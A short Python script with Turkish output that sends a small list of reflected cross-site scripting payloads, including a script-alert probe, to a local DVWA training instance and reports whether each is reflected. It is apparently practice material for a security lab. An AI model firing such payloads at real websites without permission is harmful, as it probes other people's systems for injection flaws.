import  requests

header={"Cookie":"security=low; PHPSESSID=jjbk76nopcvi02drleg9hghpi6"}
xss_list=["siber","<h1>siber","<script>alert('siber')</script>"]
for payload in xss_list:
    print(payload)
    url="http://127.0.0.1/DVWA-master/vulnerabilities/xss_r/?name="+str(payload)
    sonuc=requests.get(url=url,headers=header)
    if str(payload) in str(sonuc.content):
        print("muhtemelen xss var",str(payload))
    else:
        print("muhtemelen xss yok", str(payload))
